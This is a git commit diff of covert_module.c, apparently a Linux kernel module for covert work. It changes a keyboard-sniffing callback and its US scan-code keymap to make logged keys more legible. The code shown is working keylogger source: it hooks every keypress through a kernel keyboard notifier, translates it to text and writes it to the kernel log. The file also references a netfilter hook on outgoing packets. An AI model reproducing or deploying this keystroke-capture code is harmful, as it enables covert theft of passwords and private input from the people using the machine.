41c66ab84a74a6ecf9aed47495aff703c4c228e5
John Agapeyev <jagapeyev@gmail.com>
2018-10-30 15:31:34 -0700

    Fixed keycodes to be more legible

--- covert_module.c
+++ covert_module.c
@@ -63,39 +63,39 @@ static struct notifier_block keysniffer_blk = {
  * http://www.quadibloc.com/comp/scan.htm
  */
 static const char* us_keymap[][2] = {
-        {"\0", "\0"}, {"_ESC_", "_ESC_"}, {"1", "!"}, {"2", "@"}, // 0-3
+        {NULL, NULL}, {"<ESC>", "<ESC>"}, {"1", "!"}, {"2", "@"}, // 0-3
         {"3", "#"}, {"4", "$"}, {"5", "%"}, {"6", "^"}, // 4-7
         {"7", "&"}, {"8", "*"}, {"9", "("}, {"0", ")"}, // 8-11
-        {"-", "_"}, {"=", "+"}, {"_BACKSPACE_", "_BACKSPACE_"}, // 12-14
-        {"_TAB_", "_TAB_"}, {"q", "Q"}, {"w", "W"}, {"e", "E"}, {"r", "R"}, {"t", "T"}, {"y", "Y"},
+        {"-", "<"}, {"=", "+"}, {"<BACKSPACE>", "<BACKSPACE>"}, // 12-14
+        {"<TAB>", "<TAB>"}, {"q", "Q"}, {"w", "W"}, {"e", "E"}, {"r", "R"}, {"t", "T"}, {"y", "Y"},
         {"u", "U"}, {"i", "I"}, // 20-23
         {"o", "O"}, {"p", "P"}, {"[", "{"}, {"]", "}"}, // 24-27
-        {"\n", "\n"}, {"_LCTRL_", "_LCTRL_"}, {"a", "A"}, {"s", "S"}, // 28-31
+        {"<ENTER>", "<ENTER>"}, {"<LCTRL>", "<LCTRL>"}, {"a", "A"}, {"s", "S"}, // 28-31
         {"d", "D"}, {"f", "F"}, {"g", "G"}, {"h", "H"}, // 32-35
         {"j", "J"}, {"k", "K"}, {"l", "L"}, {";", ":"}, // 36-39
-        {"'", "\""}, {"`", "~"}, {"_LSHIFT_", "_LSHIFT_"}, {"\\", "|"}, // 40-43
+        {"'", "\""}, {"`", "~"}, {"<LSHIFT>", "<LSHIFT>"}, {"\\", "|"}, // 40-43
         {"z", "Z"}, {"x", "X"}, {"c", "C"}, {"v", "V"}, // 44-47
         {"b", "B"}, {"n", "N"}, {"m", "M"}, {",", "<"}, // 48-51
-        {".", ">"}, {"/", "?"}, {"_RSHIFT_", "_RSHIFT_"}, {"_PRTSCR_", "_KPD*_"},
-        {"_LALT_", "_LALT_"}, {" ", " "}, {"_CAPS_", "_CAPS_"}, {"F1", "F1"}, {"F2", "F2"},
-        {"F3", "F3"}, {"F4", "F4"}, {"F5", "F5"}, // 60-63
+        {".", ">"}, {"/", "?"}, {"<RSHIFT>", "<RSHIFT>"}, {"<PRTSCR>", "<KPD*>"},
+        {"<LALT>", "<LALT>"}, {"<SPACE>", "<SPACE>"}, {"<CAPS>", "<CAPS>"}, {"F1", "F1"},
+        {"F2", "F2"}, {"F3", "F3"}, {"F4", "F4"}, {"F5", "F5"}, // 60-63
         {"F6", "F6"}, {"F7", "F7"}, {"F8", "F8"}, {"F9", "F9"}, // 64-67
-        {"F10", "F10"}, {"_NUM_", "_NUM_"}, {"_SCROLL_", "_SCROLL_"}, // 68-70
-        {"_KPD7_", "_HOME_"}, {"_KPD8_", "_UP_"}, {"_KPD9_", "_PGUP_"}, // 71-73
-        {"-", "-"}, {"_KPD4_", "_LEFT_"}, {"_KPD5_", "_KPD5_"}, // 74-76
-        {"_KPD6_", "_RIGHT_"}, {"+", "+"}, {"_KPD1_", "_END_"}, // 77-79
-        {"_KPD2_", "_DOWN_"}, {"_KPD3_", "_PGDN"}, {"_KPD0_", "_INS_"}, // 80-82
-        {"_KPD._", "_DEL_"}, {"_SYSRQ_", "_SYSRQ_"}, {"\0", "\0"}, // 83-85
-        {"\0", "\0"}, {"F11", "F11"}, {"F12", "F12"}, {"\0", "\0"}, // 86-89
-        {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},
-        {"_KPENTER_", "_KPENTER_"}, {"_RCTRL_", "_RCTRL_"}, {"/", "/"}, {"_PRTSCR_", "_PRTSCR_"},
-        {"_RALT_", "_RALT_"}, {"\0", "\0"}, // 99-101
-        {"_HOME_", "_HOME_"}, {"_UP_", "_UP_"}, {"_PGUP_", "_PGUP_"}, // 102-104
-        {"_LEFT_", "_LEFT_"}, {"_RIGHT_", "_RIGHT_"}, {"_END_", "_END_"}, {"_DOWN_", "_DOWN_"},
-        {"_PGDN", "_PGDN"}, {"_INS_", "_INS_"}, // 108-110
-        {"_DEL_", "_DEL_"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, // 111-114
-        {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, // 115-118
-        {"_PAUSE_", "_PAUSE_"}, // 119
+        {"F10", "F10"}, {"<NUM>", "<NUM>"}, {"<SCROLL>", "<SCROLL>"}, // 68-70
+        {"<KPD7>", "<HOME>"}, {"<KPD8>", "<UP>"}, {"<KPD9>", "<PGUP>"}, // 71-73
+        {"-", "-"}, {"<KPD4>", "<LEFT>"}, {"<KPD5>", "<KPD5>"}, // 74-76
+        {"<KPD6>", "<RIGHT>"}, {"+", "+"}, {"<KPD1>", "<END>"}, // 77-79
+        {"<KPD2>", "<DOWN>"}, {"<KPD3>", "<PGDN"}, {"<KPD0>", "<INS>"}, // 80-82
+        {"<KPD.>", "<DEL>"}, {"<SYSRQ>", "<SYSRQ>"}, {NULL, NULL}, // 83-85
+        {NULL, NULL}, {"F11", "F11"}, {"F12", "F12"}, {NULL, NULL}, // 86-89
+        {NULL, NULL}, {NULL, NULL}, {NULL, NULL}, {NULL, NULL}, {NULL, NULL}, {NULL, NULL},
+        {"<KPENTER>", "<KPENTER>"}, {"<RCTRL>", "<RCTRL>"}, {"/", "/"}, {"<PRTSCR>", "<PRTSCR>"},
+        {"<RALT>", "<RALT>"}, {NULL, NULL}, // 99-101
+        {"<HOME>", "<HOME>"}, {"<UP>", "<UP>"}, {"<PGUP>", "<PGUP>"}, // 102-104
+        {"<LEFT>", "<LEFT>"}, {"<RIGHT>", "<RIGHT>"}, {"<END>", "<END>"}, {"<DOWN>", "<DOWN>"},
+        {"<PGDN", "<PGDN"}, {"<INS>", "<INS>"}, // 108-110
+        {"<DEL>", "<DEL>"}, {NULL, NULL}, {NULL, NULL}, {NULL, NULL}, // 111-114
+        {NULL, NULL}, {NULL, NULL}, {NULL, NULL}, {NULL, NULL}, // 115-118
+        {"<PAUSE>", "<PAUSE>"}, // 119
 };
 
 /*
@@ -428,31 +428,26 @@ unsigned int outgoing_hook(void* priv, struct sk_buff* skb, const struct nf_hook
 }
 
 int keysniffer_cb(struct notifier_block* nblock, unsigned long code, void* _param) {
-    size_t len;
     struct keyboard_notifier_param* param = _param;
-    const char *keycode = NULL;
-
-    printk(KERN_INFO "code: 0x%lx, down: 0x%x, shift: 0x%x, value: 0x%x\n", code, param->down, param->shift,
-            param->value);
+    const char* keycode = NULL;
 
     /* Trace only when a key is pressed down */
     if (!(param->down)) {
         return NOTIFY_OK;
     }
 
-    //if (param->value > KEY_RESERVED && param->value <= KEY_PAUSE) {
-    if (param->value > -1 && param->value <= 119) {
+    //119 is the highest keycode we can translate
+    if (param->value <= 119) {
         keycode = us_keymap[param->value][param->shift];
     } else {
         return NOTIFY_OK;
     }
-    len = strlen(keycode);
     // Unmapped keycode
-    if (len < 1) {
+    if (!keycode) {
         return NOTIFY_OK;
     }
 
-    printk(KERN_INFO "%s\n", keycode);
+    printk(KERN_INFO "Keycode: %s\n", keycode);
 
     return NOTIFY_OK;
 }
